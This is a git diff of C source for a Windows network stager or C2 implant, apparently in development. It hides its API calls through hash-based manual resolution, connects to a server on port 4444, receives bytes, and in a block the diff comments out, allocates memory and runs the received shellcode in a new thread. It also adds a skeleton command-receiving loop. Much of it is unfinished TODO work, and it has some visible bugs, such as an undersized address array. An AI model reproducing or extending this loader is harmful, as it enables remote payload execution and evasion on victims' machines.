@@ -25,11 +25,51 @@
 
 #include "../utils/ministd.h"
 
+#include "MessageConsumer.h"
+
 #include "logging.h"
+
+
+
+
+//int receiveMessages(Config* config, FuncRecv pRecv) // TODO: figure out if passing pRecv is the best way to do this
+int receiveMessages(uint8_t* buffer, size_t bytes_received, Config* config)
+{
+	// TODO: replace 'true' with a condition
+	while (true) // TODO: change to var... while tcp connection is valid/established/successful
+	{
+		// TODO: socket stuff
+
+		// MessageConsumer::handle(message); // TODO: this is c++... convert to c
+		// if there's incoming commands...
+
+		// TODO: should probs def move this pRecv logic somewhere else maybe in MessageConsumer? 
+		// so thorough validiating and error checks can be done on the data. stuff like making sure message isn't empty
+		// and is a valid MessageType and what not
+		//unsigned char buffer[4096]; // TODO: type should be uint8_t?
+		//int bytes_received = pRecv(config->sock, (char*)buffer, 4096, 0);
+
+		handleTCP(buffer, bytes_received, config);
+
+		// if heartbeat interval elapsed... 
+		// sendMessage(MessageType HEARTBEAT)
+
+		// sleepWithJitter()
+
+		// if connection is lost, attempt to reconnect... maybe do this logic somewhere else?
+	}
+
+	return 0; // if no errors, return 0
+}
+	
 
 
 int run(const char* host, const char* port)
 {
+
+	//Config* config = loadConfig();
+	Config config = loadConfig();
+
     // 1. manually resolve apis
     /*
     TODO: 
@@ -47,22 +87,12 @@ int run(const char* host, const char* port)
 	FARPROC funcAddresses[] = {NULL};
 	DWORD hashes[4] = {VIRTUALALLOC_HASH, VIRTUALPROTECT_HASH, CREATETHREAD_HASH, WAITFORSINGLEOBJECT_HASH};
 
-	int val = GetProcAddressManualHashes(
+	GetProcAddressManualHashes(
 				kernel32_module, 
 				hashes,
 				funcAddresses,
-				4
-				);
+				4);
 
-	if (val != 0)
-	{
-		DEBUG_PRINT("error1: %d\n", val);
-		return 1;
-	}
-	else
-	{
-		DEBUG_PRINT("working\n");
-	}
 
 
     FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)funcAddresses[0];
@@ -123,22 +153,12 @@ int run(const char* host, const char* port)
 	FARPROC funcAddresses1[] = {NULL};
 	DWORD hashes1[] = {WSASTARTUP_HASH, WSACLEANUP_HASH, GETADDRINFO_HASH, FREEADDRINFO_HASH, SOCKET_HASH, CLOSESOCKET_HASH, CONNECT_HASH, RECV_HASH};
 
-	val = GetProcAddressManualHashes(
+	GetProcAddressManualHashes(
 				ws2_32_module, 
 				hashes1,
 				funcAddresses1,
-				8
-				);
+				8);
 
-	if (val != 0)
-	{
-		DEBUG_PRINT("error: %d\n", val);
-		return 1;
-	}
-	else
-	{
-		DEBUG_PRINT("working\n");
-	}
 
     FuncWSAStartup pWSAStartup = (FuncWSAStartup)funcAddresses1[0];
     FuncWSACleanup pWSACleanup = (FuncWSACleanup)funcAddresses1[1];
@@ -159,12 +179,10 @@ int run(const char* host, const char* port)
     FuncRecv pRecv = (FuncRecv)GetProcAddressManualHash(ws2_32_module, RECV_HASH);
 	*/
 
-    //std::cout << "1 - Starting" << std::endl;
 	// DEBUG_PRINT("1 - Starting\n");
     
     WSADATA wsaData;
     if (pWSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
-        //std::cout << "WSAStartup failed" << std::endl;
         // DEBUG_PRINT("WSAStartup failed\n");
         return 1;
     }
@@ -172,13 +190,11 @@ int run(const char* host, const char* port)
     SOCKET sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) 
 	{
-        //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
 		// DEBUG_PRINT("socket failed: %d\n", WSAGetLastError());
 		DEBUG_PRINT("socket failed\n");
         return 1;
     }
 
-    //std::cout << "2 - Socket created" << std::endl;
     // DEBUG_PRINT("2 - Socket created\n"); 
 
     //ADDRINFOA hints, *result = nullptr;
@@ -194,12 +210,10 @@ int run(const char* host, const char* port)
     //if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0) 
     if (pGetAddrInfo(host, port, &hints, &result) != 0) 
 	{
-        //std::cout << "getaddrinfo failed" << std::endl;
 		DEBUG_PRINT("getaddrinfo failed\n");
         return 1;
     }
 
-    //std::cout << "3 - Address resolved" << std::endl;
     // DEBUG_PRINT("3 - Address resolved\n");
 
 
@@ -218,26 +232,32 @@ int run(const char* host, const char* port)
 
     if (!connected) 
 	{
-        //std::cout << "connect failed" << std::endl;
         DEBUG_PRINT("connect failed\n");
         return 1;
     }
 
     // 2.
-    //std::cout << "4 - Connected" << std::endl;
     // DEBUG_PRINT("4 - Connected\n");
 
-	//unsigned char shellcode[512];
+	// TODO: move this somewhere else?
+	unsigned char recvBuf[4096];
 	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
-	//int bytes_received = pRecv(sock, (char*)shellcode, 512, 0);
+	int bytes_received = pRecv(sock, (char*)recvBuf, 512, 0);
     
     //if (bytes_received <= 0) 
 	//{
-        //std::cout << "recv failed, received: " << bytes_received << std::endl;
         // DEBUG_PRINT("recv failed, received: %d\n", bytes_received);
         //return 1;
     //}
 
+	//////////////////////////////
+
+	receiveMessages(recvBuf, bytes_received, &config);
+	
+
+	//////////////////////////////
+
+	/* 
     // TODO: have server send a "keep alive" message instead
 	unsigned char shellcode[512];
     int bytes_received = 0;
@@ -263,13 +283,11 @@ int run(const char* host, const char* port)
         return 1;
     }
 
-    //std::cout << "5 - Received " << bytes_received << " bytes" << std::endl;
     // DEBUG_PRINT("5 - Received %d bytes\n", bytes_received);
 
     LPVOID beacon_mem = pVirtualAlloc(0, bytes_received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!beacon_mem) // TODO: checking if it is NULL would be more correct?
 	{
-        //std::cout << "VirtualAlloc failed: " << GetLastError() << std::endl;
         // DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
         return 1;
     }
@@ -290,7 +308,6 @@ int run(const char* host, const char* port)
         return 1;
     }
 
-    //std::cout << "6 - Memory allocated and copied" << std::endl;
     // DEBUG_PRINT("6 - Memory allocated and copied");
 
     // 4.
@@ -298,31 +315,20 @@ int run(const char* host, const char* port)
     HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
     if (!thread) 
 	{
-        //std::cout << "CreateThread failed: " << GetLastError() << std::endl;
         // DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
         return 1;
     }
 
-    //std::cout << "7 - Thread created, waiting..." << std::endl;
     // DEBUG_PRINT("7 - Thread created, waiting..."); 
     pWaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+	*/
 
-    //std::cout << "8 - Cleaning up" << std::endl;
     // DEBUG_PRINT("8 - Cleaning up"); 
     pCloseSocket(sock);
     pWSACleanup();
     return 0;
 }
 
-int receiveLoop()
-{
-	// TODO: replace 'true' with a condition
-	while (true)
-	{
-		// MessageConsumer::handle(message); // TODO: this is c++... convert to c
-		handleMessage(message);
-	}
-}
 
 int main()
 {
@@ -330,9 +336,16 @@ int main()
     //tcpStager.run("172.18.245.234", "4444");
     //tcpStager.run("10.0.0.86", "4444");
     const char server_ip[] = "127.0.0.1";
-    run(server_ip, "4444");
+    run(server_ip, "4444"); // TODO: add/replace with C2Profile Config param?
     //run("172.18.245.234", "4444");
     //run("10.0.0.86", "4444");
+
+	/* MainLoop: 
+	 * - setup socket
+	 * - connect to server
+	 * - client main loop
+	 * - close connection
+	 * */
 }
 
 
